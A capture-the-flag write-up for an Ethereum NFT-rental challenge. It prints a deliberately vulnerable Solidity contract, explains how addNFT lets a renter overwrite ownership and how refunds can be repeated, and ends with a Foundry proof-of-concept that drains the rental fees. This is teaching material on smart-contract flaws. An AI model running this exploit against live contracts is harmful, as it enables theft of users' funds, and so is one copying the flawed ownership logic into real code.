# NFTBank

## Challenge

Description:
Users can rent NFTs from the NFTBank. They have to pay a fixed commission when they want to get rent, and when they want to return NFT,
the contract will take a second fee, depending on how many days you have NFT from.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import {IERC721} from "openzeppelin-contracts/contracts/token/ERC721/IERC721.sol";
import {ERC721Holder} from "openzeppelin-contracts/contracts/token/ERC721/utils/ERC721Holder.sol";
import {ReentrancyGuard} from "openzeppelin-contracts/contracts/security/ReentrancyGuard.sol";

contract NFTBank is ReentrancyGuard, ERC721Holder {
    struct rentData {
        address collection;
        uint id;
        uint startDate;
    }

    struct nftData {
        address owner;
        uint rentFeePerDay;
        uint startRentFee;
    }
    mapping(address => mapping(uint => nftData)) public nfts;
    mapping(address => mapping(uint => uint)) public collectedFee;
    rentData[] public rentNFTs;

    error WrongETHValue();
    error YouAreNotOwner();

    function addNFT(
        address collection,
        uint id,
        uint rentFeePerDay,
        uint startRentFee
    ) external {
        nfts[collection][id] = nftData({
            owner: msg.sender,
            rentFeePerDay: rentFeePerDay,
            startRentFee: startRentFee
        });
        IERC721(collection).safeTransferFrom(msg.sender, address(this), id);
    }

    function getBackNft(
        address collection,
        uint id,
        address payable transferFeeTo
    ) external {
        if (msg.sender != nfts[collection][id].owner) revert YouAreNotOwner();
        IERC721(collection).safeTransferFrom(address(this), msg.sender, id);
        transferFeeTo.transfer(collectedFee[collection][id]);
    }

    function rent(address collection, uint id) external payable {
        IERC721(collection).safeTransferFrom(address(this), msg.sender, id);
        if (msg.value != nfts[collection][id].startRentFee)
            revert WrongETHValue();
        rentNFTs.push(
            rentData({
                collection: collection,
                id: id,
                startDate: block.timestamp
            })
        );
    }

    function refund(address collection, uint id) external payable nonReentrant {
        IERC721(collection).safeTransferFrom(msg.sender, address(this), id);
        rentData memory rentedNft = rentData({
            collection: address(0),
            id: 0,
            startDate: 0
        });
        for (uint i; i < rentNFTs.length; i++) {
            if (rentNFTs[i].collection == collection && rentNFTs[i].id == id) {
                rentedNft = rentNFTs[i];
            }
        }
        uint daysInRent = (block.timestamp - rentedNft.startDate) / 86400 > 1
            ? (block.timestamp - rentedNft.startDate) / 86400
            : 1;

        uint amount = daysInRent * nfts[collection][id].rentFeePerDay;
        if (msg.value != amount) revert WrongETHValue();
        uint index;
        for (uint i; i < rentNFTs.length; i++) {
            if (rentNFTs[i].collection == collection && rentNFTs[i].id == id) {
                index = i;
            }
        }
        collectedFee[collection][id] += amount;
        payable(msg.sender).transfer(
            nfts[rentNFTs[index].collection][rentNFTs[index].id].startRentFee
        );
        rentNFTs[index] = rentNFTs[rentNFTs.length - 1];
        rentNFTs.pop();
    }
}
```

## Solution

The NFTContract looked kind of confusing to me in the beginning, but was not that complicated after looking at it in detail.

The vulnerability consists of 2 issues.

### No check for rented NFTs during addNFT() 
When adding a NFT using addNFT() there are no checks if the NFT is already rent out. So we can just rent out an NFT and then return it to the contract using addNFT() becoming the new owner, as the struct that includes the owner is jsut overwritten.

### No check for multiple consecutive refunds

When we are the owner we can refund ourselfes and then call getBackNft() multiple times. 


### Exploit 

We can use both of those vulnerabilities by making ourself the owner of the NFT using addNFT() and getting the NFT back that way after the reutn, and using the multiple refunds to get back all our money. I implemented this in the POC like this:

```solidity
vm.startPrank(attacker);
bank.rent{value: 500 gwei}(address(meow), 1);
vm.warp(block.timestamp + 86400 * 10);
//solution start

//we add the NFT to the bank
meow.approve(address(bank), 1);
bank.addNFT(address(meow), 1, 0 gwei, 500 gwei);

//now we rent it out again
bank.rent{value: 500 gwei}(address(meow), 1);

//we refund the NFT to get back the first 500 gwei
meow.approve(address(bank), 1);
bank.refund(address(meow), 1);

//then we get it back as we are now marked as the owner
bank.getBackNft(address(meow), 1, payable(address(attacker)));

//then we refund it again to get the second 500 gwei
meow.approve(address(bank), 1);
bank.refund(address(meow), 1);

//then we get it back again
bank.getBackNft(address(meow), 1, payable(address(attacker)));

//solution end  
vm.stopPrank();
```

